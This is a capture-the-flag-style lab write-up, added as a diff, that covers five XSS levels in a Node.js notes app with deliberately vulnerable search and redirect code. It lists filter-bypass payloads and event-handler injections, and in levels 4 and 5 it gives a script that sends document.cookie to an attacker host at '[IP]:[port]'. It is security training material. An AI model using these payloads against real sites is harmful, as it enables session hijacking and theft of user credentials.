@@ -1,0 +1,270 @@
+ 
+    [-Prerequisites-]
+    
+    		Here is the structure of level 1:
+    	
+	    		.
+			├── app.js               # Main application file, setting up configuration in routes
+			├── package.json         # Package configuration file for Node.js projects
+			├── routes               
+			│   ├── index.js         # Route definitions for the main page
+			│   └── note.js          # Route definitions for handling notes
+			└── views               
+			    └── index.ejs        # Template file for the main page
+
+
+    	
+    		
+    	
+   [-Exploitation-]
+
+		      ---------------level 1----------------
+		      |                                    |
+		      |          localhost:13001           |
+		      |                                    |
+		      --------------------------------------
+		      
+		Check the lab, you see that there are one input form for note
+		The other is printing the note to the screen (here is the vuln)
+
+		[!] The note is received by the server, then store in a JSON format, source code at note.js, but seems normal
+		
+	[index.js]
+	
+				---------------------------------------------------
+				...
+				var express = require('express');
+				var router = express.Router();
+
+				router.get('/', function (req, res, next) {
+				    res.render('index');
+				});
+
+				// Note search feature
+				router.get('/search', function (req, res, next) {
+				    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'	// Print received data to screen
+				    res.send(html);
+				});
+
+				module.exports = router;
+				...
+				----------------------------------------------------
+				
+		[!] Notable that line i have commentted, you can print your note to screen
+		
+		[==>] What if we print something like a HTML or JS code to screen? The frontend will handle it, then do the work for us  ==> HTML injection
+		
+		[==>] Payload: <script>alert(document.cookie)</script>
+		
+		
+	[localhost:13001]
+	
+			connect.sid=s%3AGvavIl6Q5WcXY5PQndtzwNwkSXS3B6vM.Ydn90a38hfpwfY8fQ8V20vb%2BMoJf1H%2FtONJFCDPbK%2Fg
+			
+		=> EXPLOITED!
+		
+		      ---------------level 2----------------
+		      |                                    |
+		      |          localhost:13002           |
+		      |                                    |
+		      --------------------------------------
+		      
+		      
+		CBJS added a satinization for the input payload, lets check it	
+		  
+		  
+	[index.js]
+				 ----------------------------------------
+				 // Note search feature
+				 router.get('/search', function (req, res, next) {
+				    // Sử dụng regex để replace <script> tag
+				    // Flag g: dùng để match tất cả ký tự trong mẫu tìm kiếm
+				    // Flag i: case insensitve không phân biệt chữ hoa chữ thường
+				    sanitized_q = req.query.q.replace(/<script>|<\/script>/gi, "");
+				    html = 'Your search - <b>' + sanitized_q + '</b> - did not match any notes.<br><br>'
+				    res.send(html);
+				------------------------------------------	    
+		      
+		      
+		So, CBJS remove detect and replace tag <script>, </script> to ""
+		Which means, all tag dissappear, but how abt this:
+		
+		[==>] Payload: <scr<script>ipt>alert(document.cookie)</scr</script>ipt>, so if <script> tag dissapear, the included tag stills alive
+		
+		
+		=> EXPLOITED!
+		
+			
+		      ---------------level 3----------------
+		      |                                    |
+		      |          localhost:13003           |
+		      |                                    |
+		      --------------------------------------
+		
+		Then, CBJS change the way for sanitizing.
+		
+	[index.js]
+	
+	
+				-----------------------------------------------------
+				....
+				// Note search feature
+				router.get('/search', function (req, res, next) {
+				    // Don't allow script keyword
+				    if (req.query.q.search(/script/i) > 0) {
+					res.send('Hack detected');
+					return;
+				    }
+				    html = 'Your search - <b>' + req.query.q + '</b> - did not match any notes.<br><br>'
+				    res.send(html);
+				}
+				....
+				-----------------------------------------------------
+				
+		=> Any "script" detected insensitive case => Hack detected
+		
+		[!] So we still have another way, not just the <script> tag can execute document.cookie
+		
+		I give you somes of them below:
+
+
+		<img src="#" onerror="alert(document.cookie)">
+		<div onmouseover="alert(document.cookie)"/div>
+		<input type="text" onfocus="alert(document.cookie)">
+		<button ondblclick="alert(document.cookie)">Double click me</button>
+		<textarea onkeyup="alert(document.cookie)">Type something here</textarea>
+		<body onunload="alert(document.cookie)">
+		<body onbeforeunload="alert(document.cookie)">
+		<body onpageshow="alert(document.cookie)">
+		<body onload="alert(document.cookie)">
+
+
+		=> EXPLOITED!
+		
+	
+		      ---------------level 4----------------
+		      |                                    |
+		      |          localhost:13004           |
+		      |                                    |
+		      --------------------------------------
+		      
+		 Lets check the index.js again, you will see that nothing different, but if we use the previous payload
+		 
+		 [==>] This payload does not work anymore, HOW???
+		 
+	[app.js]
+	
+				--------------------------------
+				...
+				....
+				
+				app.use(
+				  session({
+				    resave: false,
+				    saveUninitialized: true,
+				    secret: process.env.SECRET_KEY,
+				    cookie: {
+				      maxAge: 86400000,
+				      httpOnly: true
+				    },
+				  })
+				);
+				
+				...
+				.....
+				---------------------------------
+				
+		[!] The httpOnly flag turns from false to true, so what httpOnly flag does???
+		
+		Here is the explaination from OWASP
+		
+		
+	[OWASP]
+	
+		
+		-------------------------------------------------------------------
+		What is HttpOnly?
+
+		According to the Microsoft Developer Network, HttpOnly is an additional flag included in a Set-Cookie HTTP response header. Using the HttpOnly flag when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it).
+
+		If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script (again if the browser supports this flag). As a result, even if a cross-site scripting (XSS) flaw exists, and a user accidentally accesses a link that exploits this flaw, the browser (primarily Internet Explorer) will not reveal the cookie to a third party.
+
+		If a browser does not support HttpOnly and a website attempts to set an HttpOnly cookie, the HttpOnly flag will be ignored by the browser, thus creating a traditional, script accessible cookie. As a result, the cookie (typically your session cookie) becomes vulnerable to theft or modification by malicious script
+					
+		
+		---------------------------------------------------------------------
+		
+		So seems like impossible to get cookie, since the filter <script> turn on
+		
+		[!] But now, i still tell you how we bypass it if there no filter <script>
+		
+		[==>] Payload: 
+		
+			<script>
+			   var i=new Image;
+			   i.src="http://[IP]:[port]"+btoa(document.cookie);
+			</script>
+		
+		For using this payload, you need to start a server on your machine:
+		Then when you entered the payload, it will sends a request to your server, then the cookie appears on your server side
+		
+		
+		
+		      ---------------level 5----------------
+		      |                                    |
+		      |          localhost:13005           |
+		      |                                    |
+		      --------------------------------------
+		      
+		Seems like there are big change on the backend, lets have a look, app.js this time change the httpOnly flag to false, which means we possible to get the cookie
+		
+		[!] But look at "views" directory, we have a new file "welcome.ejs"
+		
+	
+	[welcome.ejs]
+	
+	
+				-------------------------------------------------------
+				...
+				function redirect() {
+				    var url = new URL(window.location);
+				    var return_url = url.searchParams.get("return_url");
+				    window.location = return_url;
+				}
+
+				var info = localStorage.getItem("info");
+				if (info === "true") {
+				    redirect()
+				}
+				...
+				--------------------------------------------------------
+				
+				
+			This is the suspicious one, the function redirect search for value of parameter "return_url", then handle it by "window.location"
+			
+			[==>] What if we take the value of "return_url" to any URL we want! This lab is no filter the <script> tag, so we totally use the lv4 method
+			
+			
+			[==>] Payload:javascript: var i=new Image; i.src="http://[IP]:[port]"+btoa(document.cookie);
+			
+			=> EXPLOITED!
+			
+			
+			
+			
+			
+		
+		
+		
+		
+		
+	
+	
+		
+		
+		
+		
+		
+		
+
+
